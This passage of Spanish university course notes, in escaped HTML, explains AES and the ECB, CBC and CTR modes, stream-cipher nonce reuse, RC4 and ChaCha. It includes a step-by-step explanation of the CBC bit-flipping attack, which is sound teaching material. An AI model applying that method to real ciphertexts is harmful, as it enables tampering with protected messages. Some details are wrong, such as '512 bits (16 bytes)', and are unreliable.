AES\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEstandarizado\u003c/strong\u003e en el año 2000\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de llave:\u003c/strong\u003e 128, 192 o 256 bits\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de bloque:\u003c/strong\u003e 128 bits\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRondas:\u003c/strong\u003e 10, 12 o 14\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eAdvanced Encryption Standard\u003c/strong\u003e es el cifrador de bloque por defecto hoy en día. Dependiendo del tamaño de la llave, consiste en entre 10 y 14 rondas de operaciones de substitución y permutación, tal como se muestra en la figura anterior (obtenida del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e)\u003c/p\u003e\n\u003cp\u003ePara mayor información sobre la utilidad de cada ronda, se les recomienda revisar el libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e o la \u003ca href=\"https://es.wikipedia.org/wiki/AES\"\u003epágina de Wikipedia\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"modos-de-cifrado\"\u003eModos de Cifrado\u003c/h3\u003e\n\u003cp\u003eDebido a que los cifradores de bloque pueden encargarse de cifrar datos de tamaño igual al tamaño del bloque, es necesario definir estrategias que permitan cifrar información de un largo mucho mayor. Acá entran en juego los \u0026ldquo;modos de cifrado\u0026rdquo;, los cuales definen el algoritmo a usar para realizar el cifrado de la información completa.\u003c/p\u003e\n\u003cp\u003eEn todos los modos que se verán a continuación, se divide el texto completo en bloques de tamaño $BlockSize$. En caso que el texto completo no tenga un tamaño múltiplo de $BlockSize$, se agregan bytes al final de forma de rellenar (\u003cem\u003epadding\u003c/em\u003e) y obtener un texto plano de un tamaño adecuado. Lo anterior genera un problema cuando el texto ya tiene un tamaño múltiplo de $BlockSize$, por lo que en esos casos es necesario agregar un bloque completo, solo con padding.\u003c/p\u003e\n\u003cp\u003eAlgunos tipos de \u003cem\u003epadding\u003c/em\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eANSI X9.23\u003c/strong\u003e: Se rellena con bytes \u003ccode\u003e\\x00\u003c/code\u003e o algún byte al azar, salvo el último byte del bloque rellenado, que incluye como valor la cantidad de bytes usados para rellenar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePKCS7\u003c/strong\u003e: Se rellena con n bytes con el valor $hex(n)$, con $n \\in [1,BlockSize]$.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"ecb\"\u003eECB\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../ecb_enc.png\" alt=\"Cifrado ECB\"\u003e\n\u003cimg src=\"../ecb_enc.png\" alt=\"Descifrado ECB\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eElectronic Codebook\u003c/strong\u003e es el modo de cifrado más simple. Cada bloque se cifra por separado usando siempre la misma llave, concatenándose todo para generar el texto cifrado.\u003c/p\u003e\n\u003ch5 id=\"filtración-de-información-estructural\"\u003eFiltración de información estructural\u003c/h5\u003e\n\u003cp\u003eSi bien este modo es muy fácil de implementar, el mayor problema que posee es que es fácil encontrar patrones en los mensajes si los datos cifrados tienen una estructura que se repite bastante. Un muy buen ejemplo de lo anterior es esta imagen del \u003ca href=\"https://isc.tamu.edu/~lewing/linux/\"\u003ePingüino Tux\u003c/a\u003e, la cual si cifrásemos bloques de ella usando AES/ECB, podríamos ver ciertos patrones con bloques de colores parecidos que delinearían los bordes del pingüino.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../tux.jpg\" alt=\"Tux\"\u003e\n\u003cimg src=\"../tux_ecb.jpg\" alt=\"Tux ECB\"\u003e\u003c/p\u003e\n\u003ch4 id=\"cbc\"\u003eCBC\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../cbc_enc.png\" alt=\"Cifrado CBC\"\u003e\n\u003cimg src=\"../cbc_dec.png\" alt=\"Descifrado CBC\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCipher Block Chaining\u003c/strong\u003e es un modo en el que el cifrado de cada bloque depende del resultado del cifrado del bloque anterior. Como caso especial, el primer bloque utiliza un valor público llamado \u003cem\u003eVector de Inicialización\u003c/em\u003e \u003ccode\u003e(IV)\u003c/code\u003e. Es importante que este valor sea aleatorio en cada sesión de cifrado, con el objetivo de impedir algunos tipos de ataques.\u003c/p\u003e\n\u003cp\u003eEl cambio anterior con respecto a ECB ayuda a que si ciframos exactamente la misma información en dos bloques distintos, el resultado cifrado no sea el mismo, evitando problemas como los vistos con la imagen del pingüino.\u003c/p\u003e\n\u003ch5 id=\"padding-oracle-attack\"\u003ePadding Oracle Attack\u003c/h5\u003e\n\u003cp\u003eSi contamos con feedback acerca del estado de un mensaje cifrado (específicamente, si el mensaje está bien formado o no), es posible ejecutar un ataque denominado \u003ca href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\"\u003ePadding Oracle Attack\u003c/a\u003e. En el curso \u003ca href=\"https://users.dcc.uchile.cl/~eriveros/cc5312/anexos/padding-oracle/\"\u003eCC5312 Seguridad Computacional\u003c/a\u003e se explica cómo ejecutar este ataque.\u003c/p\u003e\n\u003ch5 id=\"maleabilidad-del-mensaje-cifrado-bit-flipping-attack\"\u003eMaleabilidad del mensaje cifrado (Bit Flipping Attack)\u003c/h5\u003e\n\u003cp\u003eRevisemos de nuevo la imagen de Descifrado CBC y agreguemos al diagrama el estado justo antes de hacer XOR con el bloque anterior. A este estado le llamaremos $M$:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../cbc_malleability.svg\" alt=\"Descifrado CBC\"\u003e\u003c/p\u003e\n\u003cp\u003eEnfoquémonos primero en los bytes verdes. $IV_0$ es el primer byte del vector de inicialización. Si modificamos $IV_0$, podemos notar que el valor del primer caracter del texto plano ($P_{0,0}$) cambiará, debido a que ese caracter se obtiene combinando con $\\oplus$ (xor) $M_{0,0}$ e $IV_0$.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e¿Pero por qué esto me genera un cambio solo en el primer byte si se supone que el block cipher revuelve los datos?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eEs verdad, un cifrador de bloque revuelve los datos de entrada. Esto quiere decir que si cambio un caracter en mi bloque de texto plano manteniendo la llave constante, el dato cifrado sera muy distinto al que tenía antes. Lo mismo en el caso de descifrar: si cambio un byte del dato cifrado, el texto descifrado será irreconocible comparado con el original.\u003c/p\u003e\n\u003cp\u003eSin embargo, el valor descifrado por el block cipher en el modo CBC es un valor intermedio ($M$). Tanto este valor intermedio como el vector de inicialización \u003cstrong\u003esí tienen una dependencia lineal\u003c/strong\u003e con respecto al valor descifrado.\u003c/p\u003e\n\u003cp\u003eSi conozco el texto original y quiero cambiar el primer caracter por un caracter $x$, puedo cambiar $IV_0$ por el siguiente valor:\u003c/p\u003e\n\u003cp\u003e$$\\tilde{IV_0} = IV_0 \\oplus P_{0,0} \\oplus x$$\u003c/p\u003e\n\u003cp\u003eLo anterior se cumple ya que sabemos que\u003c/p\u003e\n\u003cp\u003e$$P_{0,0} = M_{0,0} \\oplus IV_0$$\u003c/p\u003e\n\u003cp\u003ePor lo que al reemplazar $IV_0$ por $\\tilde{IV_0}$ tenemos que:\u003c/p\u003e\n\u003cp\u003e$$\\tilde{P_{0,0}} = M_{0,0} \\oplus IV_0 \\oplus P_{0,0} \\oplus x$$\u003c/p\u003e\n\u003cp\u003ereemplazando $M_{0,0} \\oplus IV_0$, queda:\u003c/p\u003e\n\u003cp\u003e$$\\tilde{P_{0,0}} = P_{0,0} \\oplus P_{0,0} \\oplus x$$\u003c/p\u003e\n\u003cp\u003ey como $a \\oplus a = 0$:\u003c/p\u003e\n\u003cp\u003e$$\\tilde{P_{0,0}} = x$$\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e¿Puedo hacer esto con el segundo, tercer, enésimo byte?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eSi es en el primer bloque, ¡sí!. más abajo veremos el caso del segundo bloque.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e¿Y qué pasa si no tengo control sobre el IV?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eSi conoces el texto por debajo y tienes control sobre los bloques, puedes sacrificar un bloque específico para editar el contenido del bloque que viene justo después de él. Para esto, debemos ver los bloques rojos en la imagen anterior.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e¿Cómo modifico el segundo bloque? ¿y el tercero?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eEn el caso puntual del texto del segundo bloque, la idea es hacer lo mismo que con el IV, pero usar el bloque cifrado $C_0,0$ (el primero) en vez de IV. Esto hará que el texto de ese bloque se rompa, pero nos permitirá cambiar el texto del bloque siguiente.\u003c/p\u003e\n\u003cp\u003eLo anterior puedes aplicarlo no solo para modificar el segundo bloque cifrado. Basta con modificar el bloque cifrado anterior al que quieres editar.\u003c/p\u003e\n\u003cp\u003e(Esta explicación está basada en \u003ca href=\"https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode\"\u003eesta respuesta\u003c/a\u003e de Stack Overflow)\u003c/p\u003e\n\u003ch4 id=\"ctr\"\u003eCTR\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../ctr_enc.png\" alt=\"Cifrado CTR\"\u003e\n\u003cimg src=\"../ctr_dec.png\" alt=\"Descifrado CTR\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCounter Mode\u003c/strong\u003e es un modo que permite paralelizar el cifrado y descifrado de un mensaje, dado que la parte que pasa por el cifrador de bloque es un valor predeterminado y predecible. Además, el descifrado se ejecuta con el algoritmo de cifrado del cifrador de bloque elegido.\u003c/p\u003e\n\u003ch2 id=\"cifradores-de-flujo\"\u003eCifradores de Flujo\u003c/h2\u003e\n\u003cp\u003eLos cifradores de flujo intentan emular el uso de un cifrador de tipo \u003cstrong\u003eOne-Time Pad\u003c/strong\u003e, pero usando un generador de números \u003cstrong\u003epseudoaleatorio\u003c/strong\u003e. Estos generadores usan una semilla realmente aleatoria al inicializarse, la cual les permite generar una salida continua extensa que se comporta de forma similar a un flujo de datos realmente aleatoria. Posteriormente, es posible cifrar un stream de datos simplemente haciendo $XOR$ entre los datos y el flujo pseudoaleatorio. Con tal de que ambas partes conozcan la semilla, es posible asegurar la sincronización entre sus flujos aleatorios, con lo que se es posible comunicarse sin problemas y sin filtrar los mensajes.\u003c/p\u003e\n\u003ch3 id=\"el-_nonce_-en-los-cifradores-de-flujo\"\u003eEl \u003cem\u003enonce\u003c/em\u003e en los cifradores de flujo\u003c/h3\u003e\n\u003cp\u003ePartamos mencionando una potencial vulnerabilidad de los cifradores de flujo. Si se usa dos veces el mismo flujo pseudoaleatorio para dos conjuntos de datos (a partir del uso de la misma semilla), y luego se ejecuta la operación $XOR$ entre ambos textos cifrados, se obtendrá como resultado lo siguiente:\u003c/p\u003e\n\u003cp\u003e$$E(P_1) = P_1 \\oplus S$$\n$$E(P_2) = P_2 \\oplus S$$\n$$E(P_1) \\oplus E(P_2) = (P_1 \\oplus S) \\oplus (P_2 \\oplus S)$$\n$$E(P_1) \\oplus E(P_2) = (P_1 \\oplus P_2)$$\u003c/p\u003e\n\u003cp\u003eAsumiendo que el texto plano tiene cierta estructura, luego no es difícil deducir qué valores corresponden a $P_1$ y $P_2$ a partir de $E(P_1) \\oplus E(P_2)$.\u003c/p\u003e\n\u003cp\u003ePara evitar el problema anterior, los cifradores de flujo suelen recibir un parámetro extra, denominado \u003cem\u003enonce\u003c/em\u003e. Este campo puede ser considerado como público sin que esto signifique disminuir la seguridad del cifrador, pero \u003cstrong\u003edebe ser distinto\u003c/strong\u003e en cada ejecución del algoritmo, por lo que en algunas implementaciones corresponde simplemente a un contador que se incrementa en cada uso del cifrador. En caso que el nonce no siga una generación predecible, es necesario compartirlo entre ambas partes que desean comunicarse.\u003c/p\u003e\n\u003ch3 id=\"rc4\"\u003eRC4\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"../rc4.png\" alt=\"Generación Aleatoriedad RC4\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño de llave\u003c/strong\u003e: Entre 40 y 2048 bits.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño del Nonce\u003c/strong\u003e: No lleva de forma oficial, aunque se suele agregar como parte de la llave.\u003c/p\u003e\n\u003cp\u003eTambién conocido como \u003cstrong\u003eARCFOUR\u003c/strong\u003e, es un cifrador de flujo diseñado el año 1987 pero filtrado el año 1994. Se comenzó a utilizar como un producto propietario de RSA Security, hasta que en el año 1994 se filtró su especificación en un foro cypherpunk.\u003c/p\u003e\n\u003cp\u003eAl hacerse público su funcionamiento, se empezaron a encontrar varios errores y vulnerabilidades en el algoritmo. Un ejemplo de estos problemas es que los primeros bytes de salida del generador pseudoaleatorio permiten adivinar el estado interno del mismo, derivándose así información sobre la clave.\u003c/p\u003e\n\u003cp\u003eSi bien su diseño no considera el uso de un nonce, éste se suele agregar de alguna de las formas siguientes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eHasheando la semilla y el nonce y usando el valor hasheado como semilla. Esta es la forma recomendada.\u003c/li\u003e\n\u003cli\u003eConcatenando la semilla con el nonce. Sin embargo, esto puede traer problemas de aleatoriedad debido a fallas propias de RC4.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEs posible encontrar más información sobre este cifrador (y sus problemas) \u003ca href=\"https://en.wikipedia.org/wiki/RC4\"\u003een wikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003ch3 id=\"chacha\"\u003eChaCha\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"../chacha.png\" alt=\"Ronda Chacha\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño de llave\u003c/strong\u003e 256 bits\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño del Nonce\u003c/strong\u003e 64 bits\u003c/p\u003e\n\u003cp\u003eChaCha es una familia de cifradores de flujo basada en una variante de Salsa20. Estos cifradores definen un estado inicial compuesto por \u0026ldquo;palabras\u0026rdquo; de 32 bit dispuestas en una matriz de 4x4:\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e(00) \u003ccode\u003eexpa\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(01) \u003ccode\u003end 3\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(02) \u003ccode\u003e2-by\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(03) \u003ccode\u003ete k\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e(04) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(05) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(06) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(07) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e(08) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(09) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(10) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(11) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e(12) \u003ccode\u003e P\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(13) \u003ccode\u003e P\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(14) \u003ccode\u003e N\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(15) \u003ccode\u003e N\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003eDonde:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e(XX) representa el número del byte (se usa más abajo)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eexpand 32-byte k\u003c/code\u003e es un texto en ASCII de 16 caracteres (4 \u003ccode\u003ewords\u003c/code\u003e de 32 bits)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eK\u003c/code\u003e es la llave dividida en 8 bloques de 32 bits cada uno\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eP\u003c/code\u003e (posición) es un contador que lleva cuenta de la cantidad de bloques cifrados.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eN\u003c/code\u003e corresponde a un \u003cem\u003enonce\u003c/em\u003e, es decir, un valor que no debe repetirse entre usos del sistema.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eSi bien el cifrado es de tipo \u0026ldquo;flujo\u0026rdquo;, los bytes de éste se generan de a bloques de tamaño 512 bits (16 bytes). Para generar el bloque de número $i$, se ejecutan los siguientes pasos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSe setean los bytes $P$ del estado \u003ccode\u003earr\u003c/code\u003e en el valor binario de $i$\u003c/li\u003e\n\u003cli\u003eSe ejecuta 10 veces la siguiente operación en pseudocódigo (denominada \u0026ldquo;doble ronda\u0026rdquo;) sobre el estado:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"n\"\u003efunc\u003c/span\u003e \u003cspan class=\"n\"\u003edouble_round\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e13\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e14\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e11\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e11\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e13\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e14\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAcá \u003ccode\u003eQR\u003c/code\u003e o \u003cem\u003e\u0026ldquo;Quarter Round\u0026rdquo;\u003c/em\u003e se define de la siguiente forma:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eY \u003ccode\u003ex \u0026lt;\u0026lt;\u0026lt;= y\u003c/code\u003e corresponde a una \u0026ldquo;rotación de y bits al valor x\u0026rdquo;.\u003c/p\u003e\n\u003cp\u003eFinalmente, los 